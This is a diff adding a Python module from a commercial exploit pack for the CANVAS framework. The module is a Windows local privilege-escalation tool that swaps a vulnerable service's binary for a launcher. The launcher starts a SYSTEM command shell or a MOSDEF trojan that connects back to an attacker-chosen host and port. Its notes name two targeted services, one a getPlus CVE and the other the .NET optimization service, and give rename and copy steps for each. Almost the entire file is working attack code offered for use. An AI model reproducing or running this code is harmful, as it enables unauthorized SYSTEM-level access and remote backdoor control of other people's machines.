@@ -1,0 +1,258 @@
+#!/usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2011
+#
+
+import sys
+
+if "." not in sys.path:
+	sys.path.append(".")
+
+import os,getopt, binascii
+import socket
+from exploitutils import *
+import canvasengine
+import time
+from canvasexploit import canvasexploit
+
+
+NAME="Generic Service Exploit"
+DESCRIPTION="Generic Service Exploit"
+
+NOTES = """
+This tool permits you to exploit a vulnerable service according to an
+original service to replace. This exploit executes a MOSDEF Trojan or a
+cmd.exe and then the original service. You need to restore the original
+binary name and launch services.msc from the SYSTEM cmd.exe to restart
+the original service.
+
+
+Usage:
+
+1) If you want to execute a cmd.exe
+python exploits/d2sec_svcwrapper/d2sec_svcwrapper.py -O use_mosdef:0 -O orig_binary:calc -O svcname:SvcCalc
+
+2) If you want to execute a MOSDEF Trojan
+python exploits/d2sec_svcwrapper/d2sec_svcwrapper.py -O callback_host:127.0.0.1 -O callback_port:5555 -O use_mosdef:1 -O orig_binary:calc -O svcname:SvcCalc -O mosdef:"c:\\temp\\blaat.exe"
+
+orig_binary is binary launched by service and to replace. Specify its name with or without 
+.exe extension. At the end, some instructions were specified.
+
+In console mode, to list vulnerabilities with which you can use d2sec_svcwrapper:
+python exploits/d2sec_svcwrapper/d2sec_svcwrapper.py -O list_vuln:1
+"""
+
+DOCUMENTATION={}
+DOCUMENTATION['VENDOR']=None
+DOCUMENTATION["Date public"]=None
+DOCUMENTATION["CERT Advisory"]=None
+DOCUMENTATION["Repeatability"]="Infinite"
+DOCUMENTATION["References"]=None
+DOCUMENTATION["CVE Name"]=None
+DOCUMENTATION["CVE Url"]=None
+DOCUMENTATION["Notes"]=NOTES
+DOCUMENTATION["Vulnerabilities"]="""
+
+===============================================================================
+1. NOS getPlus Download Manager Local Privilege Escalation
+CVE Name: CVE-2009-2564
+CVE Url: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-2564
+Ref.: http://www.securityfocus.com/bid/35740/info
+Binary name: getPlus_HelperSvc.exe
+Exploit: rename original getPlus_HelperSvc.exe to getPlus_HelperSvc.exeb.exe, 
+         create getPlus_HelperSvc.exe and copy it into 
+         C:\\Program Files\\NOS\\bin
+===============================================================================
+
+===============================================================================
+2. .NET Runtime Optimization Service Privilege Escalation
+CVE Name: N/A
+CVE Url: N/A
+Ref.: http://www.exploit-db.com/exploits/16940/
+Versions : Windows 2003, WinXP (sp3) and Win7
+Binary name: mscorsvw.exe
+Exploit: rename original mscorsvw.exe to mscorsvw.exeb.exe, 
+         create mscorsvw.exe and copy it into 
+         c:\\WINDOWS\\Microsoft.NET\\Framework\\v2.0.50727\\
+===============================================================================
+
+
+
+"""
+
+VERSION="0.1"
+
+PROPERTY={}
+PROPERTY['TYPE']="Tool"
+PROPERTY['SITE']="Local"
+PROPERTY['ARCH']=[ ["Windows"] ]
+PROPERTY["VERSION"]=["All"]
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Tools"
+PROPERTY['ARCH'] = [ ["Windows"] ]
+
+from libs.canvasos import *
+
+class theexploit(canvasexploit):
+	def __init__(self):
+		canvasexploit.__init__(self)
+		self.name = NAME
+		self.mosdef = "cmd.exe"
+		self.launcher = os.getcwd() + "/3rdparty/D2SEC/exploits/d2sec_svcwrapper/d2sec_svcwrapper.exe"
+		self.callback_host = "127.0.0.1"
+		self.callback_port=5555
+		self.OS = "Windows"
+		self.ARCH = "X86"
+		self.orig_binary = "calc"
+		self.svcname = "calc"
+		self.use_mosdef = 0 
+		self.list_vuln = 0
+		return
+
+	def getargs(self):
+		self.list_vuln = int(self.argsDict.get("list_vuln", self.list_vuln))
+		self.callback_host = self.argsDict.get("callback_host", self.callback_host)
+		self.callback_port = int(self.argsDict.get("callback_port", self.callback_port))
+		self.orig_binary = self.argsDict.get("orig_binary", self.orig_binary)
+		self.use_mosdef = int(self.argsDict.get("use_mosdef", self.use_mosdef))
+		self.mosdef = self.argsDict.get("mosdef", self.mosdef)
+		self.svcname = self.argsDict.get("svcname", self.svcname)
+
+		return
+
+	def gen_trojan(self):
+
+		self.log("[D2 LOG] Building MOSDEF Trojan")
+		t_os = canvasos(self.OS)
+		t_os.arch = self.ARCH
+
+		mosdef = os.getcwd() + "/3rdparty/D2SEC/exploits/d2sec_svcwrapper/" + self.mosdef.split('\\')[-1:][0]
+
+		self.buildmosdeftrojan(self.callback_host, self.callback_port, target_os=t_os)
+		self.log("Writing out %d bytes to %s"%(len(self.mosdeftrojan),mosdef))
+		file(mosdef,"wb").write(self.mosdeftrojan)
+	
+		self.log("\n")
+
+		return len(self.mosdeftrojan)
+	
+	def str_unicode(self, str):
+		u = ""
+		u += "\x00%s" % chr(len(str))
+
+		for s in str:
+			u += "\x00" + s
+
+		return u
+
+	def gen_launcher(self):
+		obin = "\x00\x04\x00O\x00B\x00I\x00N"
+		dbin = "\x00\x04\x00D\x00B\x00I\x00N"
+		svcn = "\x00\x04\x00S\x00V\x00C\x00N"
+
+		self.log("[D2 LOG] Building launcher")
+		if (".exe" in self.orig_binary):			
+			bin = self.orig_binary[:len(self.orig_binary) - 4]
+			bin += "b.exe"
+			self.orig_binary = self.orig_binary[:len(self.orig_binary) - 4]
+		else:
+			bin = self.orig_binary + "b.exe"						
+
+		obin_u = self.str_unicode(bin)
+		dbin_u = self.str_unicode(self.mosdef)
+		svcn_u = self.str_unicode(self.svcname)
+
+		i = open(self.launcher, "rb")
+		o = open(os.getcwd() + "/3rdparty/D2SEC/exploits/d2sec_svcwrapper/" + self.orig_binary + ".exe", "wb")
+
+		for s in i:
+			if s.find(obin) >= 0:
+				s = s.replace(obin, obin_u)
+			if s.find(dbin) >= 0:
+				s = s.replace(dbin, dbin_u)
+			if s.find(svcn) >= 0:
+				s = s.replace(svcn, svcn_u)
+			o.write(s)
+
+		o.close()
+		i.close()
+
+		self.log("\n")
+		
+	def run(self):
+		self.getargs()
+
+		self.mosdef = self.mosdef.replace('\a', '\\a')
+		self.mosdef = self.mosdef.replace('\b', '\\b')
+		self.mosdef = self.mosdef.replace('\t', '\\t')
+		self.mosdef = self.mosdef.replace('\n', '\\n')
+		self.mosdef = self.mosdef.replace('\v', '\\v')
+		self.mosdef = self.mosdef.replace('\f', '\\f')
+		self.mosdef = self.mosdef.replace('\r', '\\r')
+
+		self.setInfo("%s (in progress)"%(NAME))
+	
+		if len(self.orig_binary) == 0:
+			self.log("[D2 LOG] Specify orig_binary argument")
+			self.setInfo("%s - failed !" % (NAME))
+			return
+
+		if self.use_mosdef == 0:
+			self.mosdef = "cmd.exe /K start"
+
+		i = 1
+
+		if self.list_vuln == 1:
+			self.log("[D2 LOG] Vulnerabilities list")
+			self.log(DOCUMENTATION["Vulnerabilities"])
+			return 0
+
+		if self.use_mosdef == 1:
+			i = self.gen_trojan()
+			if not i:
+				self.log("[D2 LOG] Error MOSDEF Trojan !")
+				return i
+
+		self.gen_launcher()
+
+		if self.use_mosdef == 0:
+			self.log("%s.exe built. See in d2sec_svcwrapper folder." % (self.orig_binary))
+			self.log("Rename %s.exe in %sb.exe on vulnerable box." % (self.orig_binary, self.orig_binary))
+			self.log("And copy your launcher %s.exe in the same folder" % self.orig_binary)
+			self.log("as the original binary.")
+		else:
+			self.log("%s.exe and %s built. See in d2sec_svcwrapper folder." % (self.orig_binary, self.mosdef.split('\\')[-1:][0]))
+			self.log("Rename %s.exe in %sb.exe on vulnerable box." % (self.orig_binary, self.orig_binary))
+			self.log("And copy your launcher %s.exe in the same folder" % self.orig_binary)
+			self.log("as the original binary and your MOSDEF Trojan %s." % self.mosdef)
+
+		self.setInfo("%s - done"%(NAME))
+		return 1
+	
+	def usage(self):
+		print "Usage: %s -O options:value\n" % (sys.argv[0])
+		print "with options:"
+		print "  -O callback_host:<ip>"  
+		print "  -O callback_port:<port>"
+		print "  -O use_mosdef:0|1"
+		print "  -O list_vuln:0|1"
+		print "  -O orig_binary:<bin>"
+		print "  -O svcname:<service name>"
+		print "  -O mosdef:<bin>\n"
+
+		print NOTES
+
+		sys.exit(0)
+
+if __name__=="__main__":
+	print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
+	app = theexploit()
+	ret=standard_callback_commandline(app)
+	if ret not in [0,1,None]:
+		ret.interact()
+
